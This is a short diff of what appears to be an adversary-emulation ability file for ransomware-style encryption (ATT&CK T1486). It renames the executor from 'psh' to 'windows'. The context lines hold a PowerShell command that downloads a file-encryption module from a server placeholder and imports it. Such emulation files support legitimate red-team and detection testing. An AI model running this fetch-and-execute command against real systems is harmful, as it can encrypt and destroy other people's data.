@@ -8,7 +8,7 @@
     attack_id: T1486
     name: Data Encrypted for Impact
   executors:
-    psh:
+    windows:
       command: |
         Invoke-WebRequest -Uri #{server}/file/download -Method POST -Headers @{'file'='FileCryptography.psm1'} -OutFile FileCryptography.psm1;
         Import-Module ./FileCryptography.psm1 -Verbose -Force;
